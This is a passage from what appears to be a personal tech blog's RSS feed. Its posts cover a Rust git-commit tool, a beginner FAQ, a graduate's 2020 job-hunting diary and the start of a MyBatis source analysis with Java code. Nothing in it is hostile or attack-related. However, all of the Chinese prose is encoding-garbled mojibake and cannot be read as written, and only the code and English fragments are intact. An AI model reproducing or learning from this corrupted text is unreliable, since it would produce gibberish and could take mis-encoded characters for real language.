æˆ‘æ˜¯ä¸ªå‘½ä»¤è¡Œå·¥å…·çˆ±å¥½è€…, æˆ‘è®¤ä¸ºå‘½ä»¤è¡Œèƒ½å¸¦æ¥æ›´å¥½çš„å·¥ä½œæ•ˆç‡ä»¥åŠæ”¶ç›Š,
æˆ‘å¹³æ—¶ç¼–ç , ä¹Ÿæ˜¯éµå®ˆGitæäº¤è§„èŒƒçš„,
ä½¿ç”¨&lt;code&gt;Node.js&lt;/code&gt;å¹³å°ä¸Šçš„&lt;code&gt;git-cz&lt;/code&gt;å·¥å…·æ¥æ ¼å¼åŒ–æˆ‘çš„æäº¤ä¿¡æ¯,
ä¸è¿‡ç”±äºå®ƒå±äº&lt;code&gt;Node.js&lt;/code&gt;è¿™ä¸ªå¹³å°, ä¸å¯é¿å…, ä½ éœ€è¦å®‰è£…Node.jsçš„runtimeç¯å¢ƒ.&lt;/p&gt;
&lt;p&gt;æˆ‘æƒ³è¦ä¸€ç§æ›´åŠ æ–¹é¢å¿«é€Ÿçš„å·¥å…·, æ‰€ä»¥æˆ‘å»ºç«‹äº†GCRè¿™ä¸ªé¡¹ç›®,
å®ƒæ˜¯ä½¿ç”¨&lt;code&gt;Rust&lt;/code&gt;ç¼–å†™çš„, ä¸éœ€è¦å®‰è£…ä»»ä½•ç¯å¢ƒ, æ¯”èµ·Node, å®ƒä¼šæ›´å¿«, è€Œä¸”ä¿ç•™äº†è·¨å¹³å°çš„ç‰¹æ€§.
åœ¨GCRä¸­æˆ‘è¿˜ä¼šåŠ å…¥ä¸€äº›æ¯”è¾ƒä¸ªæ€§åŒ–çš„å…ƒç´ . GCRçœ‹èµ·æ¥å¯èƒ½ä¼šæ˜¯ä¸€ä¸ªæ›´å¥½ç”¨çš„&lt;code&gt;Git?&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªé¡¹ç›®å¯èƒ½è¿˜éœ€è¦å‡ ä¸ªæ˜ŸæœŸçš„æ—¶é—´, è¯·æœŸå¾…å§.&lt;/p&gt;
</description>
        </item>
        <item>
        <title>FAQ</title>
        <link>https://sdttttt.github.io/p/faq/</link>
        <pubDate>Sat, 19 Sep 2020 20:15:53 +0800</pubDate>
        
        <guid>https://sdttttt.github.io/p/faq/</guid>
        <description>&lt;p&gt;ä»¥å‰ä¸€äº›å°ç™½ç»å¸¸é—®æˆ‘çš„é—®é¢˜.&lt;/p&gt;
&lt;p&gt;Q: æˆ‘æƒ³è‡ªå·±å»ºç«‹ä¸€ä¸ªç½‘ç«™, æˆ‘åº”è¯¥ä½¿ç”¨ä»€ä¹ˆæŠ€æœ¯?&lt;/p&gt;
&lt;p&gt;A: Ruby on Rails.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;RORæ˜¯ä¸€æ¬¾è€ç‰Œçš„WEBMVCæ¡†æ¶, åˆ°ç°åœ¨æœ‰10å¤šå¹´çš„å†å²äº†. åœ¨ä¸­å›½, RORä½¿ç”¨çš„å¹¶ä¸å¤š,
è¿™å¹¶ä¸èƒ½è¯´æ˜å®ƒä¸ä¼˜ç§€, RORæ‹¥æœ‰éå¸¸å¤šçš„åŠŸèƒ½æ¨¡å—, å‡ ä¹æ²¡æœ‰RORåšä¸åˆ°çš„.
è®ºå¼€å‘æ•ˆç‡,RORç»å¯¹èƒ½æ»¡è¶³ä½ , Rubyè¿™ä¸ªè¯­è¨€, å¦‚æœä½ æœ‰å»å­¦è¿‡,
ä¼šå‘ç°ä»–çš„è¯­æ³•éå¸¸çš„éšæ„. è‡ªå·±é€ ä¸€ä¸ªè¯­æ³•Rubyéƒ½èƒ½æ”¯æŒ, æˆ‘è®¤ä¸º, Rubyæ˜¯åœ¨æ‰€æœ‰è¯­è¨€ä¸­å¼€å‘ä½“éªŒæœ€å¥½çš„è¯­è¨€. è‰¯å¥½çš„å¼€å‘ä½“éªŒåŠ ä¸Šä¼˜ç§€çš„å¼€å‘æ•ˆç‡, RORæ˜¯å€¼å¾—ä½ å»ä½¿ç”¨çš„.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Q: æˆ‘æƒ³å†™ä¸€ç‚¹å°å·¥å…·, æˆ‘åº”è¯¥ç”¨ä»€ä¹ˆè¯­è¨€?&lt;/p&gt;
&lt;p&gt;A: Python.&lt;/p&gt;
</description>
        </item>
        <item>
        <title>æ—¥å¿—</title>
        <link>https://sdttttt.github.io/p/%E6%97%A5%E5%BF%97/</link>
        <pubDate>Sat, 19 Sep 2020 11:06:17 +0800</pubDate>
        
        <guid>https://sdttttt.github.io/p/%E6%97%A5%E5%BF%97/</guid>
        <description>&lt;p&gt;ç›®å‰è¿˜æ˜¯ä¸ª5æœˆä»½åˆšæ¯•ä¸šçš„åº”å±Šç”Ÿ, ä»Šå¹´è¿˜æ˜¯æ’åˆ°äº†ç–«æƒ…è¿™ä¸ªæ—¶é—´å£ä¸Š,
å·¥ä½œçœŸæ˜¯ç›¸å½“çš„éš¾æ‰¾, 6æœˆåˆ°7æœˆçš„æ ·å­, æˆ‘å»å°è¯•å»è€ƒé©¾ç…§, ç›®å‰è¿˜åœ¨ç§‘ç›®äºŒè¿™è¾¹å¡ç€,
ä¸­é—´æœ‰ç©ºä¹Ÿæ˜¯å„ç§æ‰¾å•ä½å»é¢è¯•.&lt;/p&gt;
&lt;p&gt;æ¯”è¾ƒå¹¸è¿, æˆ‘åœ¨8æœˆåˆçš„æ—¶å€™æ”¶åˆ°äº†æ¥è‡ªå®‰æ’ä¿¡æ¯çš„é¢è¯•é€šçŸ¥, ä»–ä»¬æ˜¯ä¸€å®¶ä¸Šå¸‚å…¬å¸, è§„æ¨¡ä¹Ÿä¸å°, æˆ‘ä¹Ÿæ˜¯è¢«åˆ«äººå†…æ¨æ‰æœ‰è¿™ä¸ªé¢è¯•èµ„æ ¼çš„, é¢è¯•ä¸€å…±ä¸‰è½®, å‰ä¸¤è½®æŠ€æœ¯é¢è¯•, æœ€åä¸€è½®ç»¼åˆé¢è¯•, ç¬¬ä¸€è½®æŠ€æœ¯é¢è¯•å¤§æ¦‚å°±æ˜¯é—®äº†æˆ‘ä¸€äº›JVMåŸç†, ä»¥åŠç¼–ç æ€è·¯, è¿˜æœ‰ä¸€äº›æˆ‘æ¯”è¾ƒæ“…é•¿çš„åˆ†å¸ƒå¼å­˜å‚¨çš„é—®é¢˜. ç¬¬ä¸€è½®è¿‡çš„å‘¢ä¹Ÿè¿˜ç®—æƒŠé™©. ç¬¬äºŒè½®æ˜¯åœ¨å‡ å¤©å, é—®çš„å†…å®¹åŸºæœ¬ä¸Šæ˜¯ä¸€äº›JDKæºç , æ•°æ®ç»“æ„, è¿˜æœ‰ä¸€äº›æ¡†æ¶é—®é¢˜.æˆ‘å›ç­”çš„è¿˜ç®—æ˜¯æµç•…, ä¹Ÿç®—æ˜¯è¿‡äº†.å¯æƒœ,æœ€åä¸€è½®é¢è¯•ä¹‹å‰,å› ä¸ºå®‰æ’ä¸æ‹›æ”¶985,211ä»¥å¤–çš„åº”å±Šç”Ÿ, æ‰€ä»¥æˆ‘è¢«æ·˜æ±°äº†.&lt;/p&gt;
&lt;p&gt;åé¢æ¯å¤©åœ¨æ™šä¸ŠæŠ•ç®€å†, å¤§æ¦‚åœ¨ä¸€ä¸ªæœˆå, åˆæœ‰æ–°çš„é¢è¯•æ¥äº†, ä¸€å®¶å«åšéƒ¦é¸£ç§‘æŠ€çš„å…¬å¸, é¢è¯•å®˜é—®çš„éƒ½æ˜¯ä¸€äº›ä¸šåŠ¡å¤„ç†é€»è¾‘, èº«ä¸ºåº”å±Šç”Ÿçš„æˆ‘ä¹Ÿæ˜¯åƒäº†äº, å› ä¸ºæˆ‘æ ¹æœ¬æ²¡æœ‰å®é™…çš„å·¥ä½œç»éªŒ. ä¸è¿‡æˆ‘è¿˜æ˜¯ä»¥è¯•ç”¨ç”Ÿçš„èº«ä»½è¿›å»äº†.&lt;/p&gt;
&lt;p&gt;æ–°äººå…¥èŒç¬¬ä¸€å¤©å°±æ˜¯å…ˆæŠŠå…¬å¸é¡¹ç›®çš„ä»£ç è¿‡ä¸€è¾¹, çœ‹äº†ä»–ä»¬å…¬å¸çš„ä»£ç ä¹‹å, è¯´å®è¯, æˆ‘éå¸¸å¤±æœ›, å¤æ‚çš„å¯¹è±¡å…³ç³»ç»“æ„, é•¿å†—çš„æ§åˆ¶å™¨å‡½æ•°, ä»¥åŠç©ºç©ºå¦‚ä¹Ÿçš„testæ–‡ä»¶å¤¹, æˆ‘ä¸çŸ¥é“ä»–ä»¬çš„é¡¹ç›®èƒ½ç»´æŠ¤å¤šé•¿æ—¶é—´, å¯èƒ½æ˜¯æˆ‘çš„æƒ³æ³•å¤ªæç«¯äº†, å¤§å­¦æ—¶çš„æˆ‘å°±å¼€å§‹å—åˆ°é©¬ä¸ç¦å‹’çš„è½¯ä»¶è®¾è®¡æ€æƒ³çš„å½±å“, å¯¹ç»´æŠ¤æ€§å·®çš„ä»£ç å˜å¾—æ•æ„Ÿèµ·æ¥. æˆ‘è¾¹è¯»ä»–ä»¬çš„ä»£ç , è¾¹é‡æ„ç€. å°±è¿™æ ·è¿‡äº†ä¸€ä¸ªæ˜ŸæœŸ.&lt;/p&gt;
&lt;p&gt;åœ¨è¿™å‘¨é‡Œ, æˆ‘è¿˜æ”¶åˆ°äº†æ¥è‡ªç”µä¿¡å’Œä¸€å®¶ç”µå­äº¤æ˜“å…¬å¸çš„é¢è¯•é€šçŸ¥, æˆ‘å¾ˆé«˜å…´, å› ä¸ºæˆ‘å¯¹ç°åœ¨çš„å·¥ä½œå¹¶ä¸æ„Ÿåˆ°æ»¡è¶³, åœ¨å‘¨äº”, æˆ‘è¯·äº†å‡, å»é¢è¯•, ç”µä¿¡è¿™è¾¹å¾ˆé¡ºåˆ©, é¢è¯•å®˜å’Œæˆ‘è¯´, ä»–å–œæ¬¢æˆ‘çš„å¼€æºé¡¹ç›®, å¹¶ä¸”å¯¹æˆ‘çš„CICDæŠ€æœ¯æ„Ÿå…´è¶£, è€Œä¸”ä»–ä¹Ÿä¸å…³å¿ƒæˆ‘çš„å­¦å†, æˆ‘çœŸçš„å¾ˆé«˜å…´.ä¸è¿‡åœ¨å½•ç”¨ä¹‹å‰,é¢è¯•å®˜è¯´å¾—å…ˆå’Œä¸Šçº§æ±‡æŠ¥, å› ä¸ºå½•ä¸å½•ç”¨ä¸æ˜¯ä»–èƒ½å†³å®šçš„.&lt;/p&gt;
&lt;p&gt;ä¸‹åˆ, æˆ‘å»äº†é‚£å®¶ç”µå­äº¤æ˜“å…¬å¸é¢è¯•, ä¸è¿‡åº”å±Šç”Ÿåœ¨ä»–ä»¬å…¬å¸é¢è¯•ä¹‹å‰å¾—å…ˆåšè¯•å·, å†…å®¹æ˜¯å…³äºJavaçš„, æˆ‘æœ‰ç‚¹åƒæƒŠ, ä¸è¿‡æˆ‘ä¹Ÿå‘ç°äº†, å¯¹äºä¸€äº›javaä»£ç çš„è¿è¡Œç»†èŠ‚æˆ‘è¿˜äº†è§£çš„ä¸å¤Ÿæ¸…æ¥š, åœ¨è¿™é‡Œåˆå‘ç°äº†è‡ªå·±çš„ç¼ºç‚¹, æˆ‘æ„Ÿåˆ°å¾ˆæ»¡è¶³. è¯•å·å®Œæˆå, å°±æ˜¯é¢è°ˆäº†, é¢è¯•å®˜çœ‹èµ·æ¥æ¥è¿‘30å², ä»–å…ˆé—®äº†æˆ‘çš„å¼€æºé¡¹ç›®çš„é—®é¢˜, æ¥ç€æ˜¯ä¸€äº›JavaåŸºç¡€çš„é—®é¢˜, æœ€ååˆè€ƒäº†è€ƒæˆ‘çš„ä¸šåŠ¡èƒ½åŠ›, ä»–å‡ºäº†ä¸€ä¸ªç§’æ€é¢˜, æˆ‘å›ç­”çš„å¹¶ä¸ç®—å¥½, åº”è¯¥åªç­”å¯¹äº†ä¸€åŠ.
è¿™æ¬¡çš„é¢è¯•åº”è¯¥æ˜¯å‡‰äº†.å›å®¶çš„è·¯ä¸Šæˆ‘å°±æ˜¯è¿™æ ·æƒ³çš„.&lt;/p&gt;
&lt;p&gt;æœ€åå¸Œæœ›ç”µä¿¡çš„é¢è¯•èƒ½å¤Ÿé¡ºåˆ©å§.&lt;/p&gt;
</description>
        </item>
        <item>
        <title>MyBatis æºç åˆ†æ</title>
        <link>https://sdttttt.github.io/p/mybatis-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</link>
        <pubDate>Thu, 10 Sep 2020 22:15:42 +0800</pubDate>
        
        <guid>https://sdttttt.github.io/p/mybatis-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</guid>
        <description>&lt;p&gt;å…¶å®å¾ˆæ—©å°±æƒ³å†™ä¸€ç¯‡ iBatis çš„æºç åˆ†æäº†, ä¸è¿‡æœ‰æ®µæ—¶é—´å»å­¦ä¹  Go äº†, Java å°±æ”¾ä¸‹äº†, æœ€è¿‘
é‡æ–°æ¡èµ· Java å°±æŠŠä»¥å‰æ²¡å¡«çš„å‘,å¡«ä¸€ä¸‹.&lt;/p&gt;
&lt;h1 id=&#34;init&#34;&gt;Init&lt;/h1&gt;
&lt;p&gt;ç°åœ¨å¼€å§‹æ­£ç‰‡.&lt;/p&gt;
&lt;p&gt;é¦–å…ˆæ˜¯ iBatis çš„åˆå§‹åŒ–å·¥ä½œ.æˆ‘ä»¬çœ‹ä¸‹é¢çš„ä»£ç :&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-Java&#34; data-lang=&#34;Java&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// `BlogDataSourceFactory`çš„ä¸»è¦ä½œç”¨: é€šè¿‡ä½ çš„é…ç½®æ–‡ä»¶, åˆå§‹åŒ–ä¸€ä¸ªDataSource
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;DataSource&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;dataSource&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;BlogDataSourceFactory&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getBlogDataSource&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;// JdbcTransactionFactoryä¸€ä¸ªNewå°±èƒ½å¾—åˆ°, æ²¡ä»€ä¹ˆä¾èµ–æ¡ä»¶
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;TransactionFactory&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;transactionFactory&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;JdbcTransactionFactory&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;// Environmentè¦ä½ äº¤å‡ºæ•°æ®æºå’Œäº‹åŠ¡å·¥å‚è¿˜æœ‰ä½ çš„ç¯å¢ƒæ˜¯å¼€å‘è¿˜æ˜¯ç”Ÿäº§
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Environment&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;environment&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Environment&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;development&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;transactionFactory&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;dataSource&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;// Configurationæœ‰åŸºæœ¬ä¸Šä½ æ‰€æœ‰çš„é…ç½®
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Configuration&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;configuration&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Configuration&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;environment&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;// æ·»åŠ ä½ çš„mapperåˆ°é…ç½®åˆ—è¡¨ä¸­, ç­‰ä¼šæˆ‘ä»¬å»åˆ†æå®ƒ
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;configuration&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;addMapper&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;BlogMapper&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;// é€šè¿‡ä½ çš„é…ç½®ç±»,è®©æˆ‘ä»¬åˆå§‹åŒ–ä¸€ä¸ªSqlSessionFactory! æˆ‘ä»¬ç»ˆäºè¿›å…¥æ­£é¢˜äº†!!
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;// å¯èƒ½ä½ è§‰å¾—å¾ˆå¿«... å…¶å®æœ¬äººåœ¨è¿™é‡Œé¢åˆ†æè¿˜æ˜¯èŠ±äº†å¾ˆé•¿æ—¶é—´
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SqlSessionFactory&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sqlSessionFactory&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SqlSessionFactoryBuilder&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;build&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;configuration&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¥½, ä¸Šæ–‡æœ‰è¯´&lt;code&gt;configuration.addMapper(BlogMapper.class)&lt;/code&gt;è¿™ä¸ªæ–¹æ³•, ç°åœ¨æˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹å®ƒ.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-Java&#34; data-lang=&#34;Java&#34;&gt;
    &lt;span class=&#34;c1&#34;&gt;// è¿™ä¸ªæ˜¯Configurationä¸­çš„æ–¹æ³•, å®ƒå®é™…ä¸Šæ˜¯å§”æ‰˜mapperRegistryå»æ‰§è¡Œ
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;T&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;addMapper&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;T&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;mapperRegistry&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;addMapper&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;

    &lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;T&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;addMapper&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;T&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;//mapperå¿…é¡»æ˜¯æ¥å£
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;isInterface&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;())&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hasMapper&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;c1&#34;&gt;//å¦‚æœé‡å¤æ·»åŠ äº†ï¼ŒæŠ¥é”™
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;            &lt;span class=&#34;k&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;BindingException&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Type &amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34; is already known to the MapperRegistry.&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
        &lt;span class=&#34;kt&#34;&gt;boolean&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;loadCompleted&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;c1&#34;&gt;// åŠ å…¥ä¸€ä¸ªMapperçš„ä»£ç†ç”Ÿäº§å·¥å‚
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;            &lt;span class=&#34;n&#34;&gt;knownMappers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;put&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;MapperProxyFactory&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;T&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;));&lt;/span&gt;
            &lt;span class=&#34;c1&#34;&gt;// It&amp;#39;s important that the type is added before the parser is run
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;            &lt;span class=&#34;c1&#34;&gt;// otherwise the binding may automatically be attempted by the
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;            &lt;span class=&#34;c1&#34;&gt;// mapper parser. If the type is already known, it won&amp;#39;t try.
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;            &lt;span class=&#34;c1&#34;&gt;// è¿™ä¸ªæ˜¯é€šè¿‡æ³¨è§£æ¥æ„å»ºMapper, æš‚æ—¶ä¸çœ‹
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;            &lt;span class=&#34;n&#34;&gt;MapperAnnotationBuilder&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;parser&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;MapperAnnotationBuilder&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;config&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;parser&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;parse&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;loadCompleted&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;finally&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;c1&#34;&gt;//å¦‚æœåŠ è½½è¿‡ç¨‹ä¸­å‡ºç°å¼‚å¸¸éœ€è¦å†å°†è¿™ä¸ªmapperä»mybatisä¸­åˆ é™¤
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;            &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;loadCompleted&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;knownMappers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;remove&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
            &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;sqlsessionfactory&#34;&gt;SqlSessionFactory&lt;/h1&gt;
&lt;p&gt;æ—¢ç„¶æœ‰äº† SqlSessionFactoryï¼Œé¡¾åæ€ä¹‰ï¼Œæˆ‘ä»¬å¯ä»¥ä»ä¸­è·å¾— SqlSession çš„å®ä¾‹ã€‚
SqlSession æä¾›äº†åœ¨æ•°æ®åº“æ‰§è¡Œ SQL å‘½ä»¤æ‰€éœ€çš„æ‰€æœ‰æ–¹æ³•ã€‚
